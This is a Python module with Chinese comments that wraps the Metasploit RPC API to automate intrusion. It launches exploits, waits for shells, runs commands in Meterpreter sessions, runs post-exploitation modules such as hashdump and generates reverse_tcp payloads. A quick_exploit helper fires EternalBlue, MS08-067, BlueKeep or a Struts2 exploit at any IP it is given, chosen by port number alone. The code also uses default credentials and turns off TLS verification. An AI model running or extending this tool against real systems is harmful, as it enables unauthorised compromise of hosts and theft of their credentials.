#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
增强版Metasploit集成模块 - 完整的漏洞利用框架集成

功能：
    - Metasploit RPC API完整封装
    - 模块搜索和加载
    - 漏洞利用执行
    - Payload生成和配置
    - Session管理（Meterpreter/Shell）
    - 后渗透模块执行
    - 数据库集成
    - 控制台交互

使用方式：
    msf = MetasploitEnhanced(host='127.0.0.1', port=55553, password='msf')
    msf.connect()
    modules = msf.search_modules('ms17_010')
    result = msf.execute_exploit('exploit/windows/smb/ms17_010_eternalblue', {'RHOSTS': '192.168.1.1'})
"""

import os
import sys
import json
import time
import requests
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from loguru import logger


@dataclass
class MSFModule:
    """Metasploit模块信息"""
    type: str  # exploit, auxiliary, payload, post, encoder, nop
    name: str
    full_name: str
    rank: str = ""
    description: str = ""
    authors: List[str] = field(default_factory=list)
    references: List[str] = field(default_factory=list)
    options: Dict[str, Any] = field(default_factory=dict)
    targets: List[str] = field(default_factory=list)
    platforms: List[str] = field(default_factory=list)


@dataclass
class MSFSession:
    """Metasploit会话信息"""
    id: int
    type: str  # meterpreter, shell
    platform: str
    target_host: str
    target_port: int
    via_exploit: str
    via_payload: str
    info: str = ""
    opened_at: str = ""
    last_checkin: str = ""

    def to_dict(self) -> Dict:
        return {
            'id': self.id,
            'type': self.type,
            'platform': self.platform,
            'target_host': self.target_host,
            'target_port': self.target_port,
            'via_exploit': self.via_exploit,
            'via_payload': self.via_payload,
            'info': self.info,
            'opened_at': self.opened_at,
        }


@dataclass
class ExploitResult:
    """漏洞利用结果"""
    success: bool = False
    module: str = ""
    target: str = ""
    payload: str = ""
    session_id: int = -1
    session_type: str = ""
    output: str = ""
    error: str = ""
    loot: List[Dict] = field(default_factory=list)
    credentials: List[Dict] = field(default_factory=list)

    def to_dict(self) -> Dict:
        return {
            'success': self.success,
            'module': self.module,
            'target': self.target,
            'payload': self.payload,
            'session_id': self.session_id,
            'session_type': self.session_type,
            'output': self.output,
            'error': self.error,
            'loot': self.loot,
            'credentials': self.credentials,
        }


class MetasploitEnhanced:
    """
    增强版Metasploit集成器
    
    提供完整的Metasploit RPC API封装，支持：
    - 模块搜索和信息查询
    - 漏洞利用执行
    - Payload生成
    - Session管理和交互
    - 后渗透模块执行
    - 数据库查询
    """

    def __init__(self, host: str = '127.0.0.1', port: int = 55553,
                 password: str = 'msf', username: str = 'msf',
                 ssl: bool = False, timeout: int = 30):
        """
        初始化Metasploit集成器
        
        Args:
            host: Metasploit RPC服务器地址
            port: Metasploit RPC服务器端口
            password: RPC密码
            username: RPC用户名
            ssl: 是否使用SSL
            timeout: 请求超时时间
        """
        self.host = host
        self.port = port
        self.password = password
        self.username = username
        self.ssl = ssl
        self.timeout = timeout
        self.token = None
        self.connected = False
        self.base_url = f"{'https' if ssl else 'http'}://{host}:{port}/api/1.0"
        logger.info(f"Metasploit集成器初始化: {self.base_url}")

    def connect(self) -> bool:
        """
        连接Metasploit RPC服务器
        
        Returns:
            是否连接成功
        """
        try:
            url = f"{self.base_url}/auth/login"
            data = {
                'username': self.username,
                'password': self.password,
            }
            response = requests.post(url, json=data, timeout=self.timeout, verify=False)
            result = response.json()

            if result.get('result') == 'success':
                self.token = result.get('token')
                self.connected = True
                logger.info(f"Metasploit连接成功，token: {self.token[:10]}...")
                return True
            else:
                logger.error(f"Metasploit连接失败: {result.get('error', '未知错误')}")
                return False
        except Exception as e:
            logger.error(f"Metasploit连接异常: {e}")
            return False

    def disconnect(self):
        """断开连接"""
        if self.connected and self.token:
            try:
                url = f"{self.base_url}/auth/logout"
                data = {'token': self.token}
                requests.post(url, json=data, timeout=self.timeout, verify=False)
            except Exception as e:
                logger.warning(f"断开连接失败: {e}")
        self.token = None
        self.connected = False
        logger.info("Metasploit已断开连接")

    def _rpc_call(self, method: str, params: Dict = None) -> Dict:
        """
        执行RPC调用
        
        Args:
            method: RPC方法名
            params: 参数
            
        Returns:
            RPC响应
        """
        if not self.connected or not self.token:
            return {'error': '未连接到Metasploit'}

        try:
            url = f"{self.base_url}/{method}"
            data = {'token': self.token}
            if params:
                data.update(params)

            response = requests.post(url, json=data, timeout=self.timeout, verify=False)
            return response.json()
        except Exception as e:
            logger.error(f"RPC调用失败 {method}: {e}")
            return {'error': str(e)}

    def get_version(self) -> Dict:
        """获取Metasploit版本信息"""
        return self._rpc_call('core/version')

    def search_modules(self, keyword: str, module_type: str = None) -> List[MSFModule]:
        """
        搜索模块
        
        Args:
            keyword: 搜索关键词
            module_type: 模块类型过滤（exploit/auxiliary/payload/post等）
            
        Returns:
            模块列表
        """
        result = self._rpc_call('module/search', {'keyword': keyword})
        modules = []

        if 'modules' in result:
            for mod in result['modules']:
                full_name = mod.get('fullname', '')
                mtype = full_name.split('/')[0] if '/' in full_name else ''

                if module_type and mtype != module_type:
                    continue

                module = MSFModule(
                    type=mtype,
                    name=mod.get('name', ''),
                    full_name=full_name,
                    rank=mod.get('rank', ''),
                    description=mod.get('description', ''),
                )
                modules.append(module)

        logger.info(f"搜索到 {len(modules)} 个模块")
        return modules

    def get_module_info(self, module_name: str) -> Optional[MSFModule]:
        """
        获取模块详细信息
        
        Args:
            module_name: 模块全名（如 exploit/windows/smb/ms17_010_eternalblue）
            
        Returns:
            模块详细信息
        """
        module_type = module_name.split('/')[0]
        result = self._rpc_call(f'module.{module_type}/info', {'module': module_name})

        if 'error' in result:
            logger.error(f"获取模块信息失败: {result['error']}")
            return None

        module = MSFModule(
            type=module_type,
            name=result.get('name', ''),
            full_name=module_name,
            rank=result.get('rank', ''),
            description=result.get('description', ''),
            authors=result.get('authors', []),
            references=result.get('references', []),
            options=result.get('options', {}),
            targets=result.get('targets', []),
            platforms=result.get('platforms', []),
        )
        return module

    def execute_exploit(self, module_name: str, options: Dict,
                        payload: str = None, payload_options: Dict = None,
                        wait_for_session: bool = True,
                        timeout: int = 60) -> ExploitResult:
        """
        执行漏洞利用
        
        Args:
            module_name: 漏洞利用模块名
            options: 模块选项（如RHOSTS, RPORT等）
            payload: Payload名称（默认自动选择）
            payload_options: Payload选项
            wait_for_session: 是否等待会话建立
            timeout: 等待超时时间
            
        Returns:
            漏洞利用结果
        """
        result = ExploitResult(module=module_name, target=options.get('RHOSTS', ''))

        try:
            # 构建参数
            params = {
                'module': module_name,
                'options': options,
            }

            if payload:
                params['payload'] = payload
            if payload_options:
                params['payload_options'] = payload_options

            # 执行漏洞利用
            rpc_result = self._rpc_call('module.exploit/execute', params)

            if 'error' in rpc_result:
                result.error = rpc_result['error']
                logger.error(f"漏洞利用失败: {result.error}")
                return result

            result.output = json.dumps(rpc_result, indent=2)
            job_id = rpc_result.get('job_id')

            logger.info(f"漏洞利用已启动，job_id: {job_id}")

            # 等待会话建立
            if wait_for_session:
                session = self._wait_for_session(timeout=timeout)
                if session:
                    result.success = True
                    result.session_id = session.id
                    result.session_type = session.type
                    result.payload = session.via_payload
                    logger.info(f"会话建立成功: {session.id} ({session.type})")
                else:
                    result.error = "等待会话超时"
                    logger.warning("等待会话超时")

            return result

        except Exception as e:
            result.error = str(e)
            logger.error(f"漏洞利用异常: {e}")
            return result

    def _wait_for_session(self, timeout: int = 60) -> Optional[MSFSession]:
        """等待新会话建立"""
        start_time = time.time()
        initial_sessions = self.get_sessions()
        initial_ids = {s.id for s in initial_sessions}

        while time.time() - start_time < timeout:
            sessions = self.get_sessions()
            new_sessions = [s for s in sessions if s.id not in initial_ids]
            if new_sessions:
                return new_sessions[0]
            time.sleep(2)

        return None

    def get_sessions(self) -> List[MSFSession]:
        """获取所有会话列表"""
        result = self._rpc_call('session/list')
        sessions = []

        if 'sessions' in result:
            for sid, info in result['sessions'].items():
                session = MSFSession(
                    id=int(sid),
                    type=info.get('type', ''),
                    platform=info.get('platform', ''),
                    target_host=info.get('target_host', ''),
                    target_port=info.get('target_port', 0),
                    via_exploit=info.get('via_exploit', ''),
                    via_payload=info.get('via_payload', ''),
                    info=info.get('info', ''),
                    opened_at=info.get('opened_at', ''),
                    last_checkin=info.get('last_checkin', ''),
                )
                sessions.append(session)

        return sessions

    def get_session_info(self, session_id: int) -> Optional[MSFSession]:
        """获取会话详细信息"""
        sessions = self.get_sessions()
        for s in sessions:
            if s.id == session_id:
                return s
        return None

    def session_execute(self, session_id: int, command: str) -> str:
        """
        在会话中执行命令
        
        Args:
            session_id: 会话ID
            command: 要执行的命令
            
        Returns:
            命令输出
        """
        result = self._rpc_call('session/shell_write', {
            'id': session_id,
            'data': command + '\n',
        })

        if 'error' in result:
            return f"命令执行失败: {result['error']}"

        # 等待输出
        time.sleep(1)
        read_result = self._rpc_call('session/shell_read', {'id': session_id})
        return read_result.get('data', '')

    def meterpreter_execute(self, session_id: int, command: str) -> str:
        """
        在Meterpreter会话中执行命令
        
        Args:
            session_id: 会话ID
            command: Meterpreter命令
            
        Returns:
            命令输出
        """
        result = self._rpc_call('session/meterpreter_write', {
            'id': session_id,
            'data': command + '\n',
        })

        if 'error' in result:
            return f"命令执行失败: {result['error']}"

        time.sleep(1)
        read_result = self._rpc_call('session/meterpreter_read', {'id': session_id})
        return read_result.get('data', '')

    def run_post_module(self, module_name: str, session_id: int,
                        options: Dict = None) -> Dict:
        """
        运行后渗透模块
        
        Args:
            module_name: 后渗透模块名（如 post/windows/gather/hashdump）
            session_id: 会话ID
            options: 模块选项
            
        Returns:
            模块执行结果
        """
        params = {
            'module': module_name,
            'session': session_id,
        }
        if options:
            params['options'] = options

        return self._rpc_call('module.post/execute', params)

    def generate_payload(self, payload_name: str, options: Dict,
                         format: str = 'raw') -> Dict:
        """
        生成Payload
        
        Args:
            payload_name: Payload名称（如 windows/meterpreter/reverse_tcp）
            options: Payload选项（如LHOST, LPORT）
            format: 输出格式（raw, exe, dll, python, powershell等）
            
        Returns:
            Payload生成结果
        """
        params = {
            'payload': payload_name,
            'options': options,
            'format': format,
        }
        return self._rpc_call('module.payload/generate', params)

    def get_jobs(self) -> Dict:
        """获取所有运行中的任务"""
        return self._rpc_call('job/list')

    def stop_job(self, job_id: int) -> bool:
        """停止任务"""
        result = self._rpc_call('job/stop', {'job_id': job_id})
        return result.get('result') == 'success'

    def kill_session(self, session_id: int) -> bool:
        """终止会话"""
        result = self._rpc_call('session/stop', {'id': session_id})
        return result.get('result') == 'success'

    def get_console_output(self, console_id: str) -> str:
        """获取控制台输出"""
        result = self._rpc_call('console/read', {'id': console_id})
        return result.get('data', '')

    def send_console_command(self, console_id: str, command: str) -> str:
        """发送控制台命令"""
        self._rpc_call('console/write', {
            'id': console_id,
            'data': command + '\n',
        })
        time.sleep(1)
        return self.get_console_output(console_id)

    def quick_exploit(self, target: str, module_name: str = None,
                      port: int = 445, payload_lhost: str = None,
                      payload_lport: int = 4444) -> ExploitResult:
        """
        快速漏洞利用（自动选择模块和Payload）
        
        Args:
            target: 目标IP
            module_name: 漏洞利用模块（默认自动检测）
            port: 目标端口
            payload_lhost: Payload监听地址
            payload_lport: Payload监听端口
            
        Returns:
            漏洞利用结果
        """
        if not module_name:
            # 根据端口自动选择常见漏洞利用模块
            if port == 445:
                module_name = 'exploit/windows/smb/ms17_010_eternalblue'
            elif port == 139:
                module_name = 'exploit/windows/smb/ms08_067_netapi'
            elif port == 3389:
                module_name = 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce'
            elif port == 80 or port == 8080:
                module_name = 'exploit/multi/http/apache_struts2_devmode_exec'
            else:
                module_name = 'exploit/multi/handler'

        options = {
            'RHOSTS': target,
            'RPORT': str(port),
        }

        payload_options = {}
        if payload_lhost:
            payload_options['LHOST'] = payload_lhost
        if payload_lport:
            payload_options['LPORT'] = str(payload_lport)

        return self.execute_exploit(
            module_name=module_name,
            options=options,
            payload_options=payload_options,
        )

    def __enter__(self):
        """上下文管理器入口"""
        self.connect()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        """上下文管理器出口"""
        self.disconnect()


# 便捷函数
def quick_msf_scan(target: str, port: int = 445, **kwargs) -> Dict:
    """快速Metasploit漏洞利用"""
    with MetasploitEnhanced(**kwargs) as msf:
        result = msf.quick_exploit(target, port=port)
        return result.to_dict()


if __name__ == '__main__':
    print("增强版Metasploit集成模块测试")
    print("=" * 50)

    msf = MetasploitEnhanced()
    print(f"RPC地址: {msf.base_url}")
    print(f"连接状态: {msf.connected}")
    print("\n使用方式:")
    print("  1. 启动msfconsole: msfconsole -q")
    print("  2. 启动RPC: load msgrpc ServerHost=127.0.0.1 ServerPort=55553 User=msf Pass=msf")
    print("  3. 连接并执行漏洞利用")
